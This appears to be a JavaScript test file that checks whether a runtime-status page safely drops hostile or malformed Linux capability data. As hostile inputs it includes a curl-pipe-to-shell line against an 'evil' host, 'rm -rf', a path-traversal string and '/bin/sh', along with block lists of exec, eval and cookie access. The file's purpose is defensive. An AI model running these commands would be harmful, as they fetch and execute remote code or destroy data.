/**
 * Focused tests for the Linux capability state on the page side (Step 5).
 *
 * Nothing in here needs a Linux machine: the runtime's answer is a plain object,
 * and the whole point of this module is that a *missing*, *hostile* or *partial*
 * answer all render as something safe and short.
 */
import { readFileSync } from 'node:fs'
import { join, dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

import {
  LINUX_LABEL,
  LINUX_REASON,
  LINUX_SUPPORT,
  LINUX_UI_STATE,
  initialLinuxState,
  linuxStateLabel,
  linuxStateTone,
  readLinuxCapability,
} from './linuxStatus.js'
import { RuntimeActivityController, RUNTIME_CONNECTION_STATE } from './runtimeActivity.js'
import { isRuntimeEvent } from './runtimeEvents.js'
import {
  LINUX_ISOLATION_KEYS,
  LINUX_REASON as RUNTIME_LINUX_REASON,
  LINUX_STATUS_KEYS,
  LINUX_SUPPORT as RUNTIME_LINUX_SUPPORT,
} from '../../../runtime/linux/capabilities.js'

const here = dirname(fileURLToPath(import.meta.url))
const root = join(here, '../../..')

let failed = 0
const assert = (condition, message) => {
  if (!condition) {
    failed += 1
    console.error(`FAIL  ${message}`)
  } else {
    console.log(`ok    ${message}`)
  }
}

let idSeq = 1
function env(type, payload, extra = {}) {
  return {
    channel: 'hpos-runtime-events',
    id: idSeq++,
    ts: Date.now(),
    type,
    ...(type.startsWith('task.') ? { taskId: payload.taskId } : {}),
    payload,
    ...extra,
  }
}

class FakeConnection {
  constructor() {
    this.snapshot = { state: RUNTIME_CONNECTION_STATE.UNKNOWN, detail: 'x', errorCode: null, checkedAt: null }
    this.listeners = new Set()
    this.started = false
    this.stopped = false
  }

  getSnapshot() { return { ...this.snapshot } }

  onChange(listener) {
    this.listeners.add(listener)
    listener(this.getSnapshot())
    return () => this.listeners.delete(listener)
  }

  start() { this.started = true; return Promise.resolve({}) }
  stop() { this.stopped = true }

  emit(patch) {
    this.snapshot = { ...this.snapshot, ...patch }
    for (const l of [...this.listeners]) l(this.getSnapshot())
  }
}

class FakeStream {
  constructor(opts) {
    this.opts = opts
    this.started = false
    this.closed = false
  }

  start() { this.started = true }
  close() { this.closed = true }
  emit(envelope) {
    if (!isRuntimeEvent(envelope)) return
    this.opts.onEvent(envelope)
  }
}

function harness(statusLinux, statusRecent = []) {
  const streams = []
  const bridge = {
    async getStatus() {
      return {
        status: 'up',
        tasks: { total: 0, active: 0, queued: 0, running: 0, completed: 0, cancelled: 0, failed: 0 },
        recent: statusRecent,
        ...(statusLinux === undefined ? {} : { linux: statusLinux }),
      }
    },
    async stopTask() { return { status: 'CANCELLED' } },
    openEventStream(options) {
      const stream = new FakeStream(options)
      streams.push(stream)
      return stream
    },
  }
  const connection = new FakeConnection()
  const controller = new RuntimeActivityController({ bridge, connection, streamFactory: (o) => harness.streamFactory(o, streams) })
  return { controller, connection, streams }
}

harness.streamFactory = (options, streams) => {
  const stream = new FakeStream(options)
  streams.push(stream)
  return stream
}

const linuxAvailable = {
  available: true,
  support: LINUX_SUPPORT.PARTIAL,
  platform: 'linux',
  isLinuxHost: true,
  executor: 'host-linux',
  adapter: 'host-linux',
  reason: LINUX_REASON.READY,
  services: ['linux-stub'],
  isolation: { namespaces: false, privilegeDrop: false, shell: false, networkIsolation: false, workspaceOnly: true },
  notes: ['this text must never reach the page'],
}

const linuxUnavailable = {
  available: false,
  support: LINUX_SUPPORT.NONE,
  platform: 'win32',
  isLinuxHost: false,
  executor: 'unavailable',
  adapter: null,
  reason: LINUX_REASON.NO_ADAPTER,
  services: ['linux-stub'],
  isolation: { namespaces: false, shell: false },
}

try {
  /* ---------------- the contract mirrors the runtime, exactly ------------- */
  {
    assert(JSON.stringify(Object.values(LINUX_SUPPORT).sort()) === JSON.stringify(Object.values(RUNTIME_LINUX_SUPPORT).sort()),
      'the client support set equals the runtime support set')
    assert(JSON.stringify(Object.values(LINUX_REASON).sort()) === JSON.stringify(Object.values(RUNTIME_LINUX_REASON).sort()),
      'the client reason set equals the runtime reason set')
    assert(LINUX_STATUS_KEYS.includes('available') && LINUX_STATUS_KEYS.includes('isolation'),
      'the runtime publishes the keys this module reads')
    assert(!LINUX_STATUS_KEYS.some((k) => /path|dir|cwd|command|argv|token|secret|cookie/i.test(k)),
      'and no published key could carry a path, command line or credential')
    assert(!LINUX_ISOLATION_KEYS.some((k) => /path|dir|cwd|command|argv|token|secret/i.test(k)),
      'and no isolation key could carry a path or a command either')
    for (const key of ['command', 'output', 'cwd', 'path', 'env', 'token', 'install', 'stdout']) {
      assert(!Object.prototype.hasOwnProperty.call(readLinuxCapability({ available: true, support: 'full', [key]: 'x' }), key),
        `a runtime field named "${key}" is not part of the page-side record`)
    }
  }

  /* ---------------- readLinuxCapability ------------------------------------ */
  {
    const partial = readLinuxCapability({ linux: linuxAvailable })
    assert(partial.known === true && partial.state === LINUX_UI_STATE.PARTIAL, 'an available-but-partial backend reads as partial')
    assert(partial.label === LINUX_LABEL[LINUX_UI_STATE.PARTIAL] && partial.label === 'Available (partial)',
      'and carries its own label')
    assert(partial.available === true && partial.support === LINUX_SUPPORT.PARTIAL, 'the two facts the UI needs')
    assert(partial.executor === 'host-linux' && partial.platform === 'linux', 'plus the adapter and platform name')
    assert(partial.reasonLabel === 'a Linux execution backend is ready', 'the copy comes from this module, not the runtime')
    assert(!JSON.stringify(partial).includes('must never reach'), 'no runtime-supplied note text is kept')
    assert(Array.isArray(partial.services) && partial.services[0] === 'linux-stub', 'service names survive')
    assert(JSON.stringify(Object.keys(partial).sort()) === JSON.stringify(Object.keys(initialLinuxState()).sort()),
      'and the record always has exactly the documented page-side shape')
    for (const key of Object.keys(partial)) {
      assert(!/dir|path|cwd|command|output/.test(key), `the page record has no "${key}" field`)
    }

    const gone = readLinuxCapability({ linux: linuxUnavailable })
    assert(gone.known === true && gone.state === LINUX_UI_STATE.UNAVAILABLE, 'unavailable is a real, known answer')
    assert(gone.label === 'Unavailable' && gone.available === false, 'rendered as "Unavailable"')
    assert(gone.executor === null, 'the runtime sentinel "unavailable" is not shown as an executor')
    assert(gone.reason === LINUX_REASON.NO_ADAPTER, 'the reason code survives for the tooltip')
    assert(gone.reasonLabel === 'no Linux backend adapter is implemented for this host', 'with client-owned wording')
    assert(gone.services.length === 1, 'the waiting service is still listed')

    const missing = readLinuxCapability(null)
    assert(missing.known === false && missing.state === LINUX_UI_STATE.UNKNOWN, 'no answer yet is "Unknown", not "unavailable"')
    assert(missing.services.length === 0 && missing.shell === false && missing.namespaces === false,
      'and nothing is assumed about isolation')
    assert(readLinuxCapability({}).known === false, 'an empty payload is unknown too')
    assert(readLinuxCapability('linux').known === false, 'a string payload is ignored')
    assert(readLinuxCapability([linuxAvailable]).known === false, 'an array payload is ignored')

    const hostile = readLinuxCapability({
      linux: {
        available: 'yes', support: 'everything', reason: 'curl -fsSL http://evil | sh',
        platform: '../../../../etc', executor: '/bin/sh', services: ['ok', 'A'.repeat(99), { x: 1 }, 'rm -rf'],
        isolation: { shell: true, namespaces: true }, notes: ['x'],
      },
    })
    assert(hostile.known === false && hostile.state === LINUX_UI_STATE.UNKNOWN,
      'a non-boolean or unknown-shaped verdict is refused, not rendered')
    const half = readLinuxCapability({
      linux: { available: true, support: LINUX_SUPPORT.FULL, reason: 'not-a-reason', platform: 'A'.repeat(40), services: ['bad name'], isolation: 'no' },
    })
    assert(half.state === LINUX_UI_STATE.AVAILABLE, 'a supported full verdict is shown as available')
    assert(half.reason === null && half.platform === null && half.services.length === 0,
      'while every unrecognised field becomes null/empty')
    assert(half.shell === false && half.namespaces === false, 'and isolation claims cannot be forged')
    const downgraded = readLinuxCapability({ linux: { available: true, support: LINUX_SUPPORT.NONE } })
    assert(downgraded.state === LINUX_UI_STATE.UNAVAILABLE, 'available with "none" support collapses to unavailable')

    assert(linuxStateLabel(missing) === 'Unknown', 'the label helper handles unknown')
    assert(linuxStateLabel(undefined) === 'Unknown', 'and a missing record')
    assert(linuxStateLabel(gone) === 'Unavailable', 'and the two-word answers')
    assert(linuxStateTone(gone).includes('muted'), 'unavailable is muted, not red: this is not an error')
    assert(linuxStateTone(partial) === '#f59e0b', 'partial is amber')
    assert(linuxStateTone({ known: true, state: LINUX_UI_STATE.AVAILABLE }) === '#22c55e', 'available is green')
    assert(initialLinuxState().known === false && initialLinuxState().label === 'Unknown',
      'the initial state is the same safe shape')
  }

  /* ---------------- the controller carries it ----------------------------- */
  {
    const { controller, connection } = harness(linuxUnavailable)
    controller.start()
    assert(controller.getSnapshot().linux.known === false, 'before a status answer, the row is unknown')
    connection.emit({ state: RUNTIME_CONNECTION_STATE.CONNECTED })
    await new Promise((r) => setTimeout(r, 0))
    assert(controller.getSnapshot().linux.state === LINUX_UI_STATE.UNAVAILABLE,
      'after connecting, the row shows the runtime verdict')
    assert(controller.getSnapshot().linux.label === 'Unavailable', 'with the short label')
    connection.emit({ state: RUNTIME_CONNECTION_STATE.DISCONNECTED })
    assert(controller.getSnapshot().linux.known === false,
      'and it goes back to unknown when the runtime is gone, rather than going stale')

    const partialRun = harness(linuxAvailable)
    partialRun.controller.start()
    partialRun.connection.emit({ state: RUNTIME_CONNECTION_STATE.CONNECTED })
    await new Promise((r) => setTimeout(r, 0))
    const snap = partialRun.controller.getSnapshot()
    assert(snap.linux.state === LINUX_UI_STATE.PARTIAL && snap.linux.executor === 'host-linux',
      'a Linux host reports the selected adapter')
    assert(snap.linux.updatedAt > 0, 'and when it last heard')

    /* a status payload with no linux section leaves the previous verdict alone */
    const none = harness(undefined)
    none.controller.start()
    none.connection.emit({ state: RUNTIME_CONNECTION_STATE.CONNECTED })
    await new Promise((r) => setTimeout(r, 0))
    assert(none.controller.getSnapshot().linux.known === false, 'an older runtime without the section is handled')
  }

  /* ---------------- the executor tag on task rows ------------------------ */
  {
    const recent = [
      { taskId: 'task-linuxrow0001', status: 'RUNNING', service: 'linux-stub', executor: 'linux' },
      { taskId: 'task-nativerow001', status: 'RUNNING', service: 'stub', executor: 'native' },
      { taskId: 'task-spoofrow00001', status: 'RUNNING', service: 'stub', executor: '/bin/sh' },
    ]
    const { controller, connection } = harness(linuxAvailable, recent)
    controller.start()
    connection.emit({ state: RUNTIME_CONNECTION_STATE.CONNECTED })
    await new Promise((r) => setTimeout(r, 0))
    const rows = controller.getSnapshot().active
    const linuxRow = rows.find((r) => r.taskId === 'task-linuxrow0001')
    assert(linuxRow && linuxRow.executor === 'linux', 'a linux row keeps its executor for the tag')
    const nativeRow = rows.find((r) => r.taskId === 'task-nativerow001')
    assert(nativeRow && nativeRow.executor === 'native', 'a native row says so')
    const spoof = rows.find((r) => r.taskId === 'task-spoofrow00001')
    assert(spoof && spoof.executor === null, 'and any other executor value is dropped, not displayed')

    assert(controller.getSnapshot().events.length === 0, 'no events were invented for the rows')
    const second = harness(linuxAvailable, recent)
    second.controller.start()
    second.connection.emit({ state: RUNTIME_CONNECTION_STATE.CONNECTED })
    await new Promise((r) => setTimeout(r, 0))
    /* the stream is the only way an event gets in, so use it */
    const stream = second.streams[0]
    assert(stream && stream.started, 'the event stream was started by the controller')
    const rejected = (() => {
      try {
        stream.emit(env('linux.status', { available: true }))
        return true
      } catch {
        return false
      }
    })()
    assert(rejected && !isRuntimeEvent(env('linux.status', { available: true })),
      'a "linux.status" event is not even a valid runtime event, so it is dropped silently')
    assert(!isRuntimeEvent({ ...env('runtime.capability', { available: true }), type: 'runtime.capability' }),
      'nor is any other new linux-flavoured type')
    const forged = { ...linuxAvailable, notes: ['echo $PATH'], isolation: { shell: true } }
    const before = second.controller.getSnapshot().linux.updatedAt
    stream.emit(env('runtime.status', { status: 'up', pid: 1, uptimeMs: 2, tasks: {}, active: [], metrics: null, linux: forged }))
    const after = second.controller.getSnapshot().linux
    assert(after.notes === undefined, 'a status event cannot add a notes field to the record')
    assert(after.shell === false && after.namespaces === false, 'nor forge an isolation claim')
    assert(after.updatedAt === before, 'and it cannot even move the timestamp — only RT_STATUS answers this row')
    assert(!Object.prototype.hasOwnProperty.call(after, 'environment'),
      'the environment model name is not even part of the page-side record')
  }

  /* ---------------- the modules stay boundary-clean ---------------------- */
  {
    for (const file of ['linuxStatus.js', 'runtimeActivity.js', 'runtimeEvents.js', 'LocalRuntimeBridge.js']) {
      const source = readFileSync(join(root, 'src/lib/bridge', file), 'utf8')
      assert(!source.includes('X-HPOS-Token'), `${file} never names the runtime credential header`)
      assert(!source.includes('endpoints.json'), `${file} never reads the endpoint file`)
      assert(!source.includes('localStorage'), `${file} never persists runtime state to storage`)
    }
    const ui = readFileSync(resolve(root, 'src/components/RuntimeStatus.jsx'), 'utf8')
    for (const forbidden of ['child_process', 'exec(', 'eval(', 'dangerouslySetInnerHTML', 'input', '<textarea', 'placeholder']) {
      assert(!ui.includes(forbidden), `RuntimeStatus.jsx has no "${forbidden}" — there is nothing to type a command into`)
    }
    assert(ui.includes('not a terminal'), 'and it still says out loud that it is not a terminal')
    assert(!/\/home\/|C:\\\\|process\.env/.test(ui), 'the component hardcodes no host path or environment access')
    const linuxSrc = readFileSync(join(root, 'src/lib/bridge/linuxStatus.js'), 'utf8')
    assert(!/window\.fetch|localStorage|sessionStorage|document\.cookie/.test(linuxSrc),
      'linuxStatus.js opens no new door to the page: no fetch, no storage, no cookies')
  }
} catch (err) {
  failed += 1
  console.error(`FAIL  threw: ${err && err.stack ? err.stack : err}`)
}

if (failed) {
  console.error(`\n${failed} linux capability state test(s) failed`)
  process.exit(1)
}
console.log('\nLinux capability state: all passed')
